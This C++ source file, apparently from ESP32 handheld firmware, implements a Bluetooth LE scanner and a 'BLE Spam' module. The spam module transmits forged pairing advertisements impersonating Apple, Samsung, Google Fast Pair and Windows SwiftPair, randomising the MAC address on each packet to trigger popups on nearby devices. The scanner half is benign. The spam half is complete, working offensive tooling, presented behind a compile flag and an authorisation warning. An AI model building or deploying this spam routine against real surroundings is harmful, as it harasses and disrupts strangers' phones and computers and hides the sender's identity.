#include "BleSpam.h"

#include <Arduino.h>
#include <NimBLEDevice.h>

extern "C" int ble_hs_id_set_rnd(const uint8_t* rnd_addr);

#include <algorithm>
#include <cstdarg>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

#include "BlePayloads.h"
#include "Config.h"
#include "Display.h"
#include "Logger.h"
#include "MenuManager.h"
#include "ModuleFlags.h"
#include "Navigation.h"
#include "Ui.h"
#include "modules/mascot/Mascot.h"
#if ENABLE_MODULE_BLEEXT
#include "modules/bleext/BleExtMenu.h"
#endif

#if ENABLE_MODULE_BLE

namespace ble {
namespace {

constexpr size_t kScanMax = 40;

struct ScanResult {
    char name[20] = {0};
    char address[18] = {0};
    int rssi = 0;
};

// Array fisso: il vecchio std::vector allocava due stringhe per ogni
// advertising ricevuto (task NimBLE), frammentando l'heap durante lo scan.
ScanResult g_results[kScanMax];
size_t g_resultCount = 0;
// Serializza onResult() (task NimBLE) con il lettore (task principale).
SemaphoreHandle_t g_resultsMtx = nullptr;

void textFormat(int x, int y, uint16_t color, uint8_t font, const char* fmt,
                ...) {
    char buffer[96];
    va_list args;
    va_start(args, fmt);
    std::vsnprintf(buffer, sizeof(buffer), fmt, args);
    va_end(args);
    static std::string text;
    text.assign(buffer);
    display::text(x, y, text, color, font);
}

void textCenteredFormat(int y, uint16_t color, uint8_t font, const char* fmt,
                        ...) {
    char buffer[96];
    va_list args;
    va_start(args, fmt);
    std::vsnprintf(buffer, sizeof(buffer), fmt, args);
    va_end(args);
    static std::string text;
    text.assign(buffer);
    display::textCentered(y, text, color, font);
}

void formatAddress(char out[18], const uint8_t address[6]) {
    std::snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", address[5],
                  address[4], address[3], address[2], address[1], address[0]);
}

// Nome dall'AD raw, senza la std::string temporanea di getName().
void copyDeviceName(NimBLEAdvertisedDevice* device, char* out, size_t cap) {
    out[0] = '\0';
    if (device == nullptr || cap < 2) {
        return;
    }
    const uint8_t* payload = device->getPayload();
    const size_t len = device->getPayloadLength();
    if (payload == nullptr) {
        return;
    }
    const uint8_t types[2] = {0x09, 0x08};
    for (uint8_t wanted : types) {
        size_t pos = 0;
        while (pos + 1 < len) {
            const uint8_t fieldLen = payload[pos];
            if (fieldLen == 0 || pos + 1 + fieldLen > len) {
                break;
            }
            if (payload[pos + 1] == wanted && fieldLen > 1) {
                size_t textLen = fieldLen - 1;
                if (textLen >= cap) {
                    textLen = cap - 1;
                }
                std::memcpy(out, payload + pos + 2, textLen);
                out[textLen] = '\0';
                return;
            }
            pos += 1 + fieldLen;
        }
    }
}

class ScanCallbacks : public NimBLEAdvertisedDeviceCallbacks {
public:
    void onResult(NimBLEAdvertisedDevice* device) override {
        if (device == nullptr) {
            return;
        }
        char address[18];
        formatAddress(address, device->getAddress().getNative());
        char name[20];
        copyDeviceName(device, name, sizeof(name));

        if (g_resultsMtx) {
            xSemaphoreTake(g_resultsMtx, portMAX_DELAY);
        }
        for (size_t i = 0; i < g_resultCount; ++i) {
            if (std::strcmp(g_results[i].address, address) == 0) {
                g_results[i].rssi = std::max(g_results[i].rssi, device->getRSSI());
                if (name[0] != '\0') {
                    std::strncpy(g_results[i].name, name,
                                 sizeof(g_results[i].name) - 1);
                    g_results[i].name[sizeof(g_results[i].name) - 1] = '\0';
                }
                if (g_resultsMtx) {
                    xSemaphoreGive(g_resultsMtx);
                }
                return;
            }
        }
        if (g_resultCount < kScanMax) {
            ScanResult& result = g_results[g_resultCount++];
            std::strncpy(result.address, address, sizeof(result.address) - 1);
            std::strncpy(result.name, name[0] != '\0' ? name : "(senza nome)",
                         sizeof(result.name) - 1);
            result.rssi = device->getRSSI();
        }
        if (g_resultsMtx) {
            xSemaphoreGive(g_resultsMtx);
        }
    }
};

void ensureBle() {
    if (g_resultsMtx == nullptr) {
        g_resultsMtx = xSemaphoreCreateMutex();
    }
    if (!NimBLEDevice::getInitialized()) {
        NimBLEDevice::init("CardputerFW");
    }
}

void drawScanProgress(int round, int total, size_t found, bool interrupted) {
    display::clear();
    display::header("BLE Scanner", "BLE");
    display::textCentered(36, interrupted ? "Scansione interrotta" : "Scansione in corso",
                          interrupted ? display::kWarning : display::kAccent, 2);
    display::progressBar(20, 58, 200, 8,
                         static_cast<float>(round) / std::max(total, 1));
    textCenteredFormat(76, display::kText, 2, "Dispositivi trovati: %u",
                       static_cast<unsigned>(found));
    display::textCentered(96, "Avvicina i dispositivi per il segnale",
                          display::kTextDim, 0);
    display::footer("ESC = interrompi");
    display::push();
}

void runScanner() {
    ensureBle();
    if (g_resultsMtx) {
        xSemaphoreTake(g_resultsMtx, portMAX_DELAY);
        g_resultCount = 0;
        xSemaphoreGive(g_resultsMtx);
    }

    NimBLEScan* scan = NimBLEDevice::getScan();
    if (scan == nullptr) {
        ui::message("BLE Scanner", {"!Stack BLE non disponibile.", "Riavvia il dispositivo."}, "BLE");
        return;
    }

    // static: la scansione globale conserva il puntatore ai callback tra una
    // schermata e l'altra; un oggetto sullo stack lascerebbe un puntatore
    // pendente appena runScanner() ritorna.
    static ScanCallbacks callbacks;
    scan->setAdvertisedDeviceCallbacks(&callbacks, true);
    scan->setActiveScan(true);
    scan->setInterval(100);
    scan->setWindow(99);
    // Nessun risultato trattenuto dallo stack: la lista e' gestita qui sopra.
    scan->setMaxResults(0);
    scan->stop();  // se una scansione precedente e' rimasta appesa

    constexpr int kRounds = 4;
    // Finestre piu' lunghe: lo scan attivo ha bisogno di tempo per ricevere le
    // SCAN_RESPONSE, che e' dove la maggior parte dei dispositivi mette il nome.
    constexpr uint32_t kRoundMs = 1500;
    // Margine oltre il quale consideriamo la finestra persa e la chiudiamo noi:
    // la variante bloccante di start() aspetta una notifica che, se il
    // controller non completa (o risponde BLE_HS_EALREADY), non arriva mai.
    constexpr uint32_t kGraceMs = 1500;

    bool aborted = false;
    navigation::waitRelease();
    for (int round = 0; round < kRounds && !aborted; ++round) {
        size_t found = 0;
        if (g_resultsMtx) {
            xSemaphoreTake(g_resultsMtx, portMAX_DELAY);
            found = g_resultCount;
            xSemaphoreGive(g_resultsMtx);
        }
        drawScanProgress(round, kRounds, found, false);
        // NimBLEScan::start() vuole i secondi, non i millisecondi.
        scan->start(kRoundMs / 1000, nullptr, false);
        const uint32_t deadline = millis() + kRoundMs + kGraceMs;
        while (scan->isScanning() && millis() < deadline) {
            navigation::update();
            if (navigation::poll().type == navigation::Event::Back) {
                aborted = true;
                break;
            }
            delay(20);
        }
        if (scan->isScanning()) {
            scan->stop();  // finestra chiusa a forza
        }
        if (g_resultsMtx) {
            xSemaphoreTake(g_resultsMtx, portMAX_DELAY);
        }
        scan->clearResults();
        if (g_resultsMtx) {
            xSemaphoreGive(g_resultsMtx);
        }
    }

    // Callback staccati e scanner fermo: la lista non e' piu' condivisa, si
    // puo' ordinare in place senza copiarla.
    scan->stop();
    scan->setAdvertisedDeviceCallbacks(nullptr, false);

    size_t foundCount = 0;
    if (g_resultsMtx) {
        xSemaphoreTake(g_resultsMtx, portMAX_DELAY);
        foundCount = g_resultCount;
        xSemaphoreGive(g_resultsMtx);
    }

    if (aborted) {
        logger::info("BLE scanner interrotto dall'utente");
    }
    logger::info("BLE scanner: %u dispositivi, stack=%s heap=%u",
                 static_cast<unsigned>(foundCount),
                 NimBLEDevice::getInitialized() ? "ok" : "non init",
                 static_cast<unsigned>(ESP.getFreeHeap()));

    if (foundCount == 0) {
        ui::message("BLE Scanner",
                    {aborted ? "!Scansione interrotta." : "!Nessun dispositivo rilevato.",
                     "Verifica che il BLE sia attivo nelle vicinanze.",
                     "Se il problema persiste, riavvia il dispositivo."},
                    "BLE");
        return;
    }

    std::sort(g_results, g_results + foundCount,
              [](const ScanResult& a, const ScanResult& b) {
                  return a.rssi > b.rssi;
              });

    MenuManager menu("Dispositivi BLE", "BLE");
    for (size_t i = 0; i < foundCount; ++i) {
        const ScanResult& result = g_results[i];
        std::string name = result.name;
        if (name.size() > 18) {
            name = name.substr(0, 18) + "~";
        }
        const std::string label =
            name + "  " + std::to_string(result.rssi) + "dBm";
        const ScanResult copy = result;
        menu.addItem(label, "ble", [copy] {
            ui::message("Dettagli BLE",
                        {"Nome: " + std::string(copy.name),
                         "MAC: " + std::string(copy.address),
                         "RSSI: " + std::to_string(copy.rssi) + " dBm"},
                        "BLE");
        });
    }
    menu.setHint("ENTER=dettagli  ESC=indietro");
    menu.run(true);
}

void drawSpam(const char* payloadName, uint32_t packets, uint32_t remainingMs,
              uint32_t totalMs, uint8_t* lastMac) {
    char macText[24];
    snprintf(macText, sizeof(macText), "%02X:%02X:%02X:%02X:%02X:%02X",
             lastMac[5], lastMac[4], lastMac[3], lastMac[2], lastMac[1],
             lastMac[0]);

    display::clear();
    display::header("BLE Spam", "BLE");
    display::text(8, 28, "Payload:", display::kTextDim, 0);
    display::text(8, 40, payloadName, display::kAccent, 2);
    textFormat(8, 62, display::kText, 0, "Pacchetti: %u",
               static_cast<unsigned>(packets));
    display::text(8, 74, "MAC casuale:", display::kTextDim, 0);
    display::text(80, 74, macText, display::kInfo, 0);
    const float fraction =
        totalMs == 0 ? 0.0f
                     : 1.0f - static_cast<float>(remainingMs) / totalMs;
    display::progressBar(8, 92, 150, 8, fraction, display::kDanger);
    textFormat(166, 93, display::kText, 0, "%us",
               static_cast<unsigned>(remainingMs / 1000));
    display::text(8, 108, "Solo dispositivi propri / ambiente isolato",
                  display::kWarning, 0);
    display::footer("ESC = interrompi");
    display::push();
}

void runSpam(const std::string& label,
             const std::vector<const BlePayload*>& payloads,
             bool randomize = false) {
    if (payloads.empty()) {
        return;
    }
#if ENABLE_OFFENSIVE
    if (!ui::legalWarning("BLE Spam - " + label,
                          {"Trasmette advertising BLE falsificati.",
                           "Puo' generare popup su dispositivi vicini.",
                           "Usalo solo su dispositivi tuoi o in ambiente",
                           "RF isolato e autorizzato."},
                          "BLE")) {
        return;
    }

    ensureBle();
    NimBLEAdvertising* advertising = NimBLEDevice::getAdvertising();
    advertising->stop();
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM, false);
    advertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
    // Il singleton e' condiviso: senza questo il tipo di PDU dipende da quale
    // modulo e' stato eseguito prima (Chat lo imposta a false).
    advertising->setScanResponse(false);

    const uint16_t intervalMs =
        static_cast<uint16_t>(std::max<uint16_t>(config::bleIntervalMs(), 20));
    uint16_t units = static_cast<uint16_t>(
        std::min<uint32_t>(16384, intervalMs * 1000UL / 625));
    advertising->setMinInterval(units);
    advertising->setMaxInterval(units);

    const uint32_t durationMs =
        static_cast<uint32_t>(std::max<uint16_t>(config::bleDurationSec(), 5)) *
        1000UL;
    const uint32_t start = millis();
    uint32_t nextPacket = 0;
    uint32_t packets = 0;
    uint32_t lastDraw = 0;
    size_t index = 0;
    uint8_t lastMac[6] = {0};
    const char* currentName = payloads[0]->name;

    // AD precompilati una sola volta: prima ogni pacchetto costruiva una
    // std::string solo per passarla a addData().
    std::vector<NimBLEAdvertisementData> adData;
    adData.reserve(payloads.size());
    for (const BlePayload* payload : payloads) {
        adData.emplace_back();
        adData.back().addData(
            reinterpret_cast<char*>(const_cast<uint8_t*>(payload->data)),
            payload->size);
    }

    navigation::waitRelease();

    while (millis() - start < durationMs) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }
        const uint32_t now = millis();
        if (now >= nextPacket) {
            advertising->stop();

            esp_fill_random(lastMac, sizeof(lastMac));
            lastMac[0] |= 0xC0;
            lastMac[5] |= 0xC0;
            ble_hs_id_set_rnd(lastMac);

            const size_t next = randomize
                                    ? static_cast<size_t>(esp_random() %
                                                          payloads.size())
                                    : index % payloads.size();
            if (!randomize) {
                ++index;
            }
            currentName = payloads[next]->name;
            advertising->setAdvertisementData(adData[next]);
            if (advertising->start(0)) {
                ++packets;
            } else {
                logger::warn("BLE advertising: start() fallito");
            }
            nextPacket = now + intervalMs;
        }

        if (now - lastDraw > 100) {
            const uint32_t elapsed = now - start;
            drawSpam(currentName, packets, durationMs - elapsed, durationMs,
                     lastMac);
            lastDraw = now;
        }
        delay(5);
    }

    advertising->stop();
    if (packets > 0) {
        mascot::award(mascot::Event::BleSpam);
    }
    // Il singleton e' condiviso con Chat/AirTag: va lasciato fermo e senza i
    // payload falsi, e l'indirizzo deve tornare pubblico.
    advertising->reset();
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_PUBLIC, false);
    logger::info("BLE spam terminato: %u pacchetti", static_cast<unsigned>(packets));
#else
    (void)label;
    ui::message("BLE Spam",
                {"Funzione non compilata.", "Compila con ENABLE_OFFENSIVE=1."},
                "BLE");
#endif
}

std::vector<const BlePayload*> applePayloads() {
    std::vector<const BlePayload*> list;
    for (const auto& payload : kApplePayloads) {
        list.push_back(&payload);
    }
    return list;
}

std::vector<const BlePayload*> googlePayloads() {
    std::vector<const BlePayload*> list;
    for (const auto& payload : kGooglePayloads) {
        list.push_back(&payload);
    }
    return list;
}

std::vector<const BlePayload*> windowsPayloads() {
    std::vector<const BlePayload*> list;
    for (const auto& payload : kWindowsPayloads) {
        list.push_back(&payload);
    }
    return list;
}

std::vector<const BlePayload*> samsungPayloads() {
    std::vector<const BlePayload*> list;
    for (const auto& payload : kSamsungPayloads) {
        list.push_back(&payload);
    }
    return list;
}

std::vector<const BlePayload*> allPayloads() {
    std::vector<const BlePayload*> list;
    list.reserve(sizeof(kApplePayloads) / sizeof(kApplePayloads[0]) +
                 sizeof(kSamsungPayloads) / sizeof(kSamsungPayloads[0]) +
                 sizeof(kGooglePayloads) / sizeof(kGooglePayloads[0]) +
                 sizeof(kWindowsPayloads) / sizeof(kWindowsPayloads[0]));
    const auto append = [&list](const BlePayload* items, size_t count) {
        for (size_t i = 0; i < count; ++i) {
            list.push_back(&items[i]);
        }
    };
    append(kApplePayloads, sizeof(kApplePayloads) / sizeof(kApplePayloads[0]));
    append(kSamsungPayloads, sizeof(kSamsungPayloads) / sizeof(kSamsungPayloads[0]));
    append(kGooglePayloads, sizeof(kGooglePayloads) / sizeof(kGooglePayloads[0]));
    append(kWindowsPayloads, sizeof(kWindowsPayloads) / sizeof(kWindowsPayloads[0]));
    return list;
}

}  // namespace

void runMenu() {
    MenuManager menu("BLE", "Menu principale");
    menu.addItem("Scanner BLE", "scan", [] { runScanner(); });
#if ENABLE_MODULE_BLEEXT
    // Il toggle in Impostazioni deve avere effetto anche qui.
    if (config::moduleEnabled(config::Module::BleExt)) {
        menu.addSeparator("Strumenti");
        menu.addItem("BLE+", "ble", [] { bleext::runMenu(); });
    }
#endif
#if ENABLE_OFFENSIVE
    menu.addSeparator("SPAM (solo test autorizzati)");
    menu.addItem("Random (tutti)", "ble", [] {
        runSpam("Random", allPayloads(), true);
    });
    menu.addItem("iOS Spam", "ble", [] {
        runSpam("iOS", applePayloads());
    });
    menu.addItem("Apple (AirPods)", "ble", [] {
        runSpam("Apple", applePayloads());
    });
    menu.addItem("Samsung Galaxy", "ble", [] {
        runSpam("Samsung", samsungPayloads());
    });
    menu.addItem("Android Spam", "ble", [] {
        runSpam("Android", googlePayloads());
    });
    menu.addItem("Google Fast Pair", "ble", [] {
        runSpam("Google", googlePayloads());
    });
    menu.addItem("Windows SwiftPair", "ble", [] {
        runSpam("Windows", windowsPayloads());
    });
    menu.addItem("Tutti in sequenza", "ble", [] {
        runSpam("Tutti", allPayloads());
    });
#endif
    menu.setHint("ESC=indietro  ;.=nav  ENTER=apri");
    menu.run(true);
}

}  // namespace ble

#endif  // ENABLE_MODULE_BLE
